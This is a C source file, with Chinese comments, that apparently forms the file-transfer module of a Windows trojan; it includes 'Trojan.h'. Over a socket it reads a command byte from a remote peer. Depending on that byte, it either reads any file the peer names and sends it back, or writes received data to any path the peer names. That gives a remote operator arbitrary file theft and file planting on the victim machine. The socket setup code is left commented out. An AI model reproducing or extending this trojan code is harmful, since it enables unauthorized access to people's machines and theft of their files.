/* 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <WinSock2.h> 
  
#define PORT 8087 
#define SERVER_IP "127.0.0.1" 
#pragma comment(lib, "WS2_32") 
*/ 
#include "Trojan.h"

#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512
void sendFile(SOCKET m_New_Socket); 
void recvFile(SOCKET m_New_Socket); 
void File(SOCKET m_New_Socket);//传输文件主函数 
void File(SOCKET m_New_Socket)
{
  // 声明并初始化一个服务端(本地)的地址结构 
/*
  sockaddr_in server_addr; 
  server_addr.sin_family = AF_INET; 
  server_addr.sin_addr.S_un.S_addr = INADDR_ANY; 
  server_addr.sin_port = htons(PORT); 
  
  // 初始化socket dll 
  WSADATA wsaData; 
  WORD socketVersion = MAKEWORD(2, 0); 
  if(WSAStartup(socketVersion, &wsaData) != 0) 
  { 
    printf("Init socket dll error!"); 
    exit(1); 
  } 
  
  // 创建socket 
  SOCKET m_Socket = socket(AF_INET, SOCK_STREAM, 0); 
    if (SOCKET_ERROR == m_Socket) 
    { 
      printf("Create Socket Error!"); 
    exit(1); 
    } 
  
  //绑定socket和服务端(本地)地址 
  if (SOCKET_ERROR == bind(m_Socket, (LPSOCKADDR)&server_addr, sizeof(server_addr))) 
  { 
    printf("Server Bind Failed: %d", WSAGetLastError()); 
    exit(1); 
  } 
  
  //监听 
  if (SOCKET_ERROR == listen(m_Socket, 10)) 
  { 
    printf("Server Listen Failed: %d", WSAGetLastError()); 
    exit(1); 
  } 
  
  
  while(1) 
  { 
    printf("Listening To Client...\n"); 
  
    sockaddr_in client_addr; 
    int client_addr_len = sizeof(client_addr); 
  
    SOCKET m_New_Socket = accept(m_Socket, (sockaddr *)&client_addr, &client_addr_len); 
    
    if (SOCKET_ERROR == m_New_Socket) 
    { 
      printf("Server Accept Failed: %d", WSAGetLastError()); 
      break; 
    } 
*/
	char buffer[1]; 
	memset(buffer, 0, 1); 
	recv(m_New_Socket, buffer, 1, 0);
	if(buffer[0]=='r'){
	sendFile(m_New_Socket);
	}
	else{
	recvFile(m_New_Socket);
	}
//    closesocket(m_New_Socket); 

  
 // closesocket(m_Socket); 
  //释放winsock库 
 // WSACleanup(); 
 // return 0; 
} 

void sendFile(SOCKET m_New_Socket){
	char buffer[BUFFER_SIZE]; 
	memset(buffer, 0, BUFFER_SIZE); 
    if (recv(m_New_Socket, buffer, BUFFER_SIZE, 0) < 0) 
    { 
      printf("Server Receive Data Failed!"); 
    } 
  
    char file_name[FILE_NAME_MAX_SIZE+1]; 
    memset(file_name, 0, FILE_NAME_MAX_SIZE+1); 
    strncpy(file_name, buffer, strlen(buffer)>FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE:strlen(buffer)); 
    printf("%s\n", file_name); 
  
    FILE * fp = fopen(file_name, "rb"); //windows下是"rb",表示打开一个只读的二进制文件 
    if (NULL == fp) 
    { 
      printf("File: %s Not Found\n", file_name); 
    } 
        else
    { 
      memset(buffer, 0, BUFFER_SIZE); 
      int length = 0; 
  
      while ((length = fread(buffer, sizeof(char), BUFFER_SIZE, fp)) > 0) 
      { 
        if (send(m_New_Socket, buffer, length, 0) < 0) 
        { 
          printf("Send File: %s Failed\n", file_name); 
        } 
        memset(buffer, 0, BUFFER_SIZE); 
      } 
  
      fclose(fp); 
      printf("File: %s Transfer Successful!\n", file_name); 
    } 
}

void recvFile(SOCKET m_New_Socket){
	char buffer[BUFFER_SIZE]; 
	memset(buffer, 0, BUFFER_SIZE); 
	recv(m_New_Socket, buffer, BUFFER_SIZE, 0);
	char filename[FILE_NAME_MAX_SIZE+1]; 
    memset(filename, 0, FILE_NAME_MAX_SIZE+1); 
    strncpy(filename, buffer, strlen(buffer)>FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE:strlen(buffer)); 
    printf("%s\n", filename); 
	FILE * fp = fopen(filename, "wb"); //windows下是"wb",表示打开一个只写的二进制文件 
  if(NULL == fp) 
  { 
    printf("File: %s Can Not Open To Write\n", filename); 
    system("pause"); 
    exit(1); 
  } 
  else
  { 
    memset(buffer, 0, BUFFER_SIZE); 
    int length = 0; 
    while ((length = recv(m_New_Socket, buffer, BUFFER_SIZE, 0)) > 0) 
    { 
      if (fwrite(buffer, sizeof(char), length, fp) < length) 
      { 
        printf("File: %s Write Failed\n", filename);
        break; 
      } 
      memset(buffer, 0, BUFFER_SIZE); 
    } 
	 fclose(fp); 
  
  }
}